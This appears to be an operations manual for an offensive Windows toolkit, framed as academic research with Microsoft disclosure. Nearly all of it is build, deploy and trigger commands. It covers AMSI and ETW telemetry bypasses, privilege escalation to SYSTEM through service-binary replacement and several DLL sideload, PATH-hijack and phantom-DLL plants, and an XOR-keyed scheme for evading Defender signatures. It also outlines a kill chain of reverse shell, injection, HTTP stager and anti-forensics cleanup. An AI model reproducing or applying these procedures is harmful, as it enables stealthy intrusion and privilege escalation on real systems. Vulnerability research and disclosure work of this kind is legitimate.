# OPERATIONS MANUAL — VADER ROOTKIT

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY

---

## Vector Index

Each vector is a self-contained attack module with unique signatures. If Defender catches one, the others survive — different XOR keys, different canary paths, different binary fingerprints.

| Vector | Codename | Directory | Type | Signature Set | XOR Key | Finding |
|--------|----------|-----------|------|---------------|---------|---------|
| V1 | ALPHA | `amsi/` | Evasion | ALPHA | 0x41 | #33 |
| V2 | BRAVO | `etw/` | Evasion | BRAVO | 0x41 | #35 |
| V3 | CHARLIE | `dark_room/` | Evasion | CHARLIE | 0x41 | #37 |
| V4 | DELTA | `vectors/v4_svc_replace/` | Privesc | DELTA | 0x52 | #42 |
| V5 | ECHO | `vectors/v5_dll_proxy/` | Privesc | ECHO | 0x37 | #38 |
| V6 | FOXTROT | `vectors/v6_path_hijack/` | Privesc | FOXTROT | 0x63 | #45 |
| V7 | GOLF | `vectors/v7_phantom_dll/` | Privesc | GOLF | 0x19 | #47 |

### Canary Files (Evidence Locations)

| Vector | Canary Path | Tag |
|--------|-------------|-----|
| V4 DELTA | `C:\Windows\Temp\svc_health.log` | DELTA_REPLACE |
| V5 ECHO | `C:\Windows\Temp\ver_cache.log` | ECHO_PROXY |
| V6 FOXTROT | `C:\Windows\Temp\hwmon_diag.log` | PATH_VECTOR |
| V7 GOLF | `C:\Windows\Temp\osp_telemetry.log` | PHANTOM_OSPPC |

---

## Prerequisites

### Compiler
```
"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe"
```

### Environment Setup
```cmd
"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
```

### Target Machine
- Windows 11 Home 24H2 (Build 26100+)
- Standard user context (no admin)
- Defender RTP ENABLED
- Own hardware only

---

## V1 ALPHA — AMSI Hardware Breakpoint Bypass

**What:** Intercepts AmsiScanBuffer at the CPU level using DR0. VEH handler returns E_INVALIDARG before any AMSI code executes. Zero memory modification.

**Build:**
```cmd
cl.exe amsi\amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-
```

**Run:**
```cmd
amsi_hwbp.exe            REM Set HWBP, spawn PowerShell
amsi_hwbp.exe --check    REM Locate AMSI only
amsi_hwbp.exe --test     REM Set HWBP, verify, exit
```

**Verify:** Output shows `BYPASS CONFIRMED — AMSI is blind`

**Limitation:** Hardware breakpoints are per-thread. Child processes (spawned PowerShell) need their own breakpoints set via injection.

---

## V2 BRAVO — ETW Hardware Breakpoint Bypass

**What:** Intercepts EtwEventWrite using DR1. VEH handler returns STATUS_SUCCESS — all process telemetry events silently discarded. Zero memory modification.

**Build:**
```cmd
cl.exe etw\etw_hwbp_annotated.c /Fe:etw_hwbp.exe /O1 /GS-
```

**Run:**
```cmd
etw_hwbp.exe             REM Set HWBP on ETW
etw_hwbp.exe --check     REM Locate only
etw_hwbp.exe --test      REM Set + verify
```

**Verify:** Output shows `ETW bypass confirmed — telemetry is blind`

---

## V3 CHARLIE — Dark Room (AMSI + ETW Combined)

**What:** Single loader that blinds both AMSI and ETW simultaneously. DR0 = AmsiScanBuffer, DR1 = EtwEventWrite. Unified VEH handler. Complete user-mode telemetry blackout.

**Build:**
```cmd
cl.exe dark_room\dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-
```

**Run:**
```cmd
dark_room.exe            REM Blind both, spawn PowerShell
dark_room.exe --test     REM Blind both, verify, exit
dark_room.exe --check    REM Locate targets only
```

**Verify:** Both `AMSI: BLIND` and `ETW: BLIND` in output.

---

## V4 DELTA — Service Binary Replacement (CWE-732)

**What:** Replaces a LocalSystem service binary that has insecure ACLs. Standard user → SYSTEM on next service restart. Launches the real service binary afterward for stealth.

**Target:** NativePushService (Wondershare)

**Build:**
```cmd
cl.exe vectors\v4_svc_replace\svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**Deploy:**
```cmd
REM Step 1: Rename running binary (Windows allows this)
ren "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe" WsNativePushService_real.exe

REM Step 2: Plant replacement
copy WsNativePushService.exe "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"

REM Step 3: Trigger (reboot or admin restart)
shutdown /r /t 0
```

**Verify:**
```cmd
type C:\Windows\Temp\svc_health.log
REM Expected: timestamp|SYSTEM|elev=1|pid=XXXX|DELTA_REPLACE
```

**Cleanup:**
```cmd
del "C:\Users\apacw\...\WsNativePushService.exe"
ren "C:\Users\apacw\...\WsNativePushService_real.exe" WsNativePushService.exe
del C:\Windows\Temp\svc_health.log
```

---

## V5 ECHO — DLL Proxy Sideload (VERSION.dll)

**What:** Drop-in proxy for VERSION.dll. Forwards all exports to real System32 copy while running payload. Lazy-init + XOR strings evade Defender ML (Finding #41).

**Build:**
```cmd
cl.exe vectors\v5_dll_proxy\version_proxy_annotated.c /Fe:VERSION.dll /LD /O1 /GS- /utf-8 /link /DEF:sideload\version.def
```

**Deploy:** Copy `VERSION.dll` to any service directory that imports it and lacks manifest DLL redirection.

**Note:** Does NOT work against NativePushService (manifest hardening, Finding #40). Valid against any other service importing VERSION.dll without manifest protection.

**Verify:**
```cmd
type C:\Windows\Temp\ver_cache.log
REM Expected: timestamp|username|elev|pid|ECHO_PROXY
```

---

## V6 FOXTROT — PATH DLL Plant (CWE-427)

**What:** Generic canary DLL for PATH hijack attacks. Planted in a user-writable machine PATH directory. When any SYSTEM service resolves a DLL via PATH search order, this loads.

**Build:**
```cmd
cl.exe vectors\v6_path_hijack\path_hijack_dll_annotated.c /Fe:targetname.dll /LD /O1 /GS- /utf-8
```
Replace `targetname` with whatever DLL the target service expects.

**Deploy:**
```cmd
copy targetname.dll "C:\Users\%USERNAME%\.local\bin\"
```

**Trigger:** Service restart, reboot, or whatever causes the service to load the DLL.

**Verify:**
```cmd
type C:\Windows\Temp\hwmon_diag.log
REM Expected: timestamp|SYSTEM|elev=1|pid=XXXX|PATH_VECTOR
```

---

## V7 GOLF — Phantom DLL (osppc.dll / ClickToRunSvc)

**What:** Exploits a phantom DLL import in Microsoft Office ClickToRunSvc. The service delay-loads osppc.dll (Office licensing) but this DLL doesn't exist anywhere on disk. User-writable PATH directory fills the void.

**Build:**
```cmd
cl.exe vectors\v7_phantom_dll\phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8
```

**Deploy:**
```cmd
copy osppc.dll "C:\Users\%USERNAME%\.local\bin\"
```

**Trigger (any one):**
```cmd
REM Option A: Wait for daily Office update task
REM Option B: Launch any Office app (Word, Excel, Outlook)
REM Option C: Force trigger
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
```

**Verify:**
```cmd
type C:\Windows\Temp\osp_telemetry.log
REM Expected: timestamp|SYSTEM|elev=1|pid=XXXX|PHANTOM_OSPPC|C:\Program Files\...\OfficeClickToRun.exe
```

**Cleanup:**
```cmd
del "C:\Users\%USERNAME%\.local\bin\osppc.dll"
del C:\Windows\Temp\osp_telemetry.log
```

**MSRC NOTE:** This is the highest-value finding. First-party Microsoft service + first-party OS search order. Confirm with Process Monitor before submitting.

---

## Signature Isolation Strategy

Each vector uses a different XOR key for string encoding:

```
V1-V3 (Evasion):  0x41 — Shared key is acceptable because these are
                          process-local and don't touch disk.
V4 (Svc Replace):  0x52 — Unique. Binary dropped to disk.
V5 (DLL Proxy):    0x37 — Unique. DLL dropped to disk.
V6 (PATH Hijack):  0x63 — Unique. DLL dropped to disk.
V7 (Phantom DLL):  0x19 — Unique. DLL dropped to disk.
```

If Defender signatures one DLL's encoded byte pattern (e.g., the XOR 0x37 encoding of "version.dll"), the other vectors are unaffected because:
1. Different XOR key = different byte sequence for the same string
2. Different canary paths = different file creation patterns
3. Different function names = different symbol tables
4. Different structure = different code flow signatures

### To generate XOR-encoded strings for a new key:
```python
key = 0x63  # or whatever
s = "your string here"
print(", ".join(f"0x{b ^ key:02X}" for b in s.encode()))
```

---

## Kill Chain Integration

### Full Chain: Standard User → SYSTEM Shell
```
Phase 0: vader_shell (reverse shell listener)          shell/
Phase 1: V1 ALPHA or V3 CHARLIE (AMSI bypass)         amsi/ or dark_room/
Phase 2: V2 BRAVO or V3 CHARLIE (ETW bypass)          etw/ or dark_room/
Phase 3: V4 DELTA or V7 GOLF (privilege escalation)   vectors/v4 or v7
Phase 4: HOTEL — DLL injection (PID or SUSPENDED)     injection/
Phase 5: INDIA — HTTP stager (WinHTTP dropper)        stagers/
Phase 6: JULIET — anti-forensics cleanup              forensics/
```

### Standalone Vectors (no chain required)
- V4 DELTA: Direct privesc, no evasion needed (canary only)
- V7 GOLF: Direct privesc, no evasion needed (canary only)
- V6 FOXTROT: Generic PATH plant, adaptable to any target

---

## Recon (Pre-Attack)

Run `vader_recon.ps1` on the target first:
```powershell
powershell -ep bypass .\recon\vader_recon.ps1
```

This identifies:
- Writable service binaries (V4 targets)
- Writable PATH directories (V6/V7 targets)
- Non-KnownDLL imports (V5 targets)
- Service manifest presence (V5 blockers)
- Defender/AV status and version

---

## Evidence Collection

After ANY vector fires, collect:
1. Canary file content (`type C:\Windows\Temp\<canary>.log`)
2. `whoami /all` from the canary process (if shell achieved)
3. Screenshot of services.msc showing the hijacked service
4. Process Monitor log filtered to the service PID
5. icacls output of the vulnerable path

This is your MSRC evidence package.

---

*VADER ROOTKIT — 22DIV / george wu*
*CSEC Tactical Cyber Operations*
*Responsible disclosure via MSRC*
